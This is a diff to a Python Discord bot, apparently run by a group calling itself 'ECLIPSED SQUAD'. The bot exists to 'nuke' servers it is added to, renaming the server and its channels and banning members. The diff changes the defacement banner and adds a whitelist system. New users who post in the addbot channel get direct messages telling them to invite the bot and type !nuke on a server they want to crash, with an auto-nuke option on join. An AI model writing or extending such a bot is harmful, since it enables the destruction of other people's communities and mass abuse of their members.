@@ -213,7 +213,7 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    NUKE_NAME = "Crash by DavaidKa"
+    NUKE_NAME = "Вы были крашнуты | ECLIPSED"
 
     # ── 1. Переименовываем сервер и все каналы ──
     try:
@@ -283,7 +283,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    TURBO_NAME = "CRASH BY ECLIPS"
+    TURBO_NAME = "Вы были крашнуты | ECLIPSED"
 
     bot_role = guild.me.top_role
     # Защищённые ID — никогда не банятся
@@ -370,7 +370,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    OWNER_NAME = "CRASH BY ECLIPS"
+    OWNER_NAME = "Вы были крашнуты | ECLIPSED"
 
     bot_role = guild.me.top_role
     targets = [
@@ -1881,6 +1881,50 @@ async def commands_owner(ctx):
 # ─── EVENTS ────────────────────────────────────────────────
 
 @bot.event
+async def on_member_remove(member):
+    """При выходе с домашнего сервера — удаляем из whitelist и пишем в ЛС."""
+    if member.guild.id != HOME_GUILD_ID:
+        return
+    uid = member.id
+    if uid == config.OWNER_ID:
+        return
+    removed = False
+    if uid in config.WHITELIST:
+        config.WHITELIST.remove(uid)
+        save_whitelist()
+        removed = True
+    if uid in PREMIUM_LIST:
+        PREMIUM_LIST.remove(uid)
+        save_premium()
+        removed = True
+    if removed:
+        try:
+            home_guild = bot.get_guild(HOME_GUILD_ID)
+            invite_url = "https://discord.gg/SZ7bd8h9"
+            if home_guild:
+                try:
+                    ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
+                    if ch:
+                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
+                        invite_url = inv.url
+                except Exception:
+                    pass
+            await member.send(
+                embed=discord.Embed(
+                    title="❌ Доступ к боту удалён",
+                    description=(
+                        "Ты вышел с нашего сервера — доступ к командам бота был удалён.\n\n"
+                        "Чтобы восстановить доступ — вернись на сервер и напиши в канал `#addbot`:\n"
+                        f"{invite_url}"
+                    ),
+                    color=0x0a0a0a
+                ).set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+            )
+        except Exception:
+            pass
+
+
+@bot.event
 async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
@@ -2738,20 +2782,21 @@ async def on_message(message):
 
     # ── Канал addbot на домашнем сервере ──────────────────────
     if (message.guild and message.guild.id == HOME_GUILD_ID
-            and message.channel.name in ("🤖・addbot", "addbot")
+            and ("addbot" in message.channel.name.lower())
             and not message.author.bot):
         uid = message.author.id
-        # Удаляем сообщение пользователя
         try:
             await message.delete()
         except Exception:
             pass
+        if uid == config.OWNER_ID:
+            return  # овнера не трогаем
         if uid in config.WHITELIST:
             try:
                 await message.author.send(
                     embed=discord.Embed(
                         title="✅ У тебя уже есть доступ",
-                        description="Ты уже в whitelist — можешь использовать команды бота.",
+                        description="Ты уже в whitelist — можешь использовать команды бота.\n\nНапиши `!help` боту в ЛС.",
                         color=0x0a0a0a
                     ).set_footer(text="☠️ ECLIPSED SQUAD")
                 )
@@ -2761,16 +2806,31 @@ async def on_message(message):
             config.WHITELIST.append(uid)
             save_whitelist()
             try:
+                home_guild = bot.get_guild(HOME_GUILD_ID)
+                invite_url = "https://discord.gg/SZ7bd8h9"
+                if home_guild:
+                    try:
+                        ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
+                        if ch:
+                            inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
+                            invite_url = inv.url
+                    except Exception:
+                        pass
                 await message.author.send(
                     embed=discord.Embed(
                         title="✅ Доступ получен!",
                         description=(
                             "Ты добавлен в whitelist и теперь можешь использовать команды бота.\n\n"
-                            "**Доступные команды:**\n"
+                            "**📋 Инструкция:**\n"
+                            "1. Добавь бота на нужный сервер через `!inv`\n"
+                            "2. Напиши `!nuke` на сервере который хочешь крашнуть\n"
+                            "3. Напиши `!help` боту в ЛС чтобы увидеть все команды\n\n"
+                            "**⚠️ Важно:** Доступ активен пока ты на нашем сервере.\n"
+                            f"При выходе с сервера доступ будет удалён.\n\n"
+                            "**Основные команды:**\n"
                             "`!nuke` — краш сервера\n"
                             "`!auto_nuke on/off` — авто-краш при входе\n"
-                            "`!stop`, `!cleanup`, `!rename`, `!nicks_all`\n\n"
-                            "Напиши `!help` боту в ЛС чтобы увидеть все команды."
+                            "`!stop` · `!cleanup` · `!rename` · `!nicks_all`"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
